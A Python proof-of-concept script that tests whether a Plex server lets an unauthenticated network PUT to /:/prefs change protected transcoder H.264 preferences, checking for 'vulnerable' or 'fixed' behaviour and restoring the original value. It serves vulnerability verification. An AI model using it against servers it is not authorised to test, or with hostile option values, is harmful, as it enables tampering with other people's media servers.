#!/usr/bin/env python3
import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET


class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def request(url, method="GET"):
    opener = urllib.request.build_opener(NoRedirectHandler)
    req = urllib.request.Request(url, method=method)
    try:
        with opener.open(req, timeout=15) as response:
            return response.status, response.read()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read()


def main():
    parser = argparse.ArgumentParser(
        description="Test network modification of protected Plex transcoder preferences"
    )
    parser.add_argument("--url", required=True, help="Plex server origin")
    parser.add_argument(
        "--preference",
        choices=("TranscoderH264Options", "TranscoderH264OptionsOverride"),
        default="TranscoderH264OptionsOverride",
    )
    parser.add_argument("--value", default="ref=2")
    parser.add_argument("--expect", choices=("vulnerable", "fixed"), required=True)
    args = parser.parse_args()

    parsed = urllib.parse.urlsplit(args.url)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        parser.error("--url must be an HTTP(S) origin")
    if parsed.path not in ("", "/") or parsed.query or parsed.fragment:
        parser.error("--url must not contain a path, query, or fragment")
    origin = args.url.rstrip("/")

    def read_value():
        get_status, body = request(f"{origin}/:/prefs")
        if get_status != 200:
            raise RuntimeError(f"GET /:/prefs returned HTTP {get_status}")
        root = ET.fromstring(body)
        for setting in root.iter():
            if setting.attrib.get("id") == args.preference:
                return setting.attrib.get("value", "")
        raise RuntimeError(f"preference not present in response: {args.preference}")

    original = read_value()
    if args.value == original:
        parser.error("--value must differ from the current preference value")
    query = urllib.parse.urlencode({args.preference: args.value})
    changed = False
    try:
        put_status, _ = request(f"{origin}/:/prefs?{query}", method="PUT")
        changed = put_status == 200
        stored = read_value()

        print(f"PUT status: {put_status}")
        print(f"Stored value: {stored!r}")
        if args.expect == "vulnerable":
            if put_status != 200 or stored != args.value:
                raise RuntimeError("vulnerable behavior was not observed")
        elif put_status != 403 or stored != original:
            raise RuntimeError("fixed behavior was not observed")
    finally:
        if changed:
            restore_query = urllib.parse.urlencode({args.preference: original})
            restore_status, _ = request(
                f"{origin}/:/prefs?{restore_query}", method="PUT"
            )
            if restore_status != 200 or read_value() != original:
                raise RuntimeError("prior preference was not restored")
    if args.expect == "vulnerable":
        print("PASS: protected transcoder preference changed over the network")
    else:
        print("PASS: request rejected and prior preference value preserved")


if __name__ == "__main__":
    try:
        main()
    except (OSError, RuntimeError, ET.ParseError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        raise SystemExit(1)
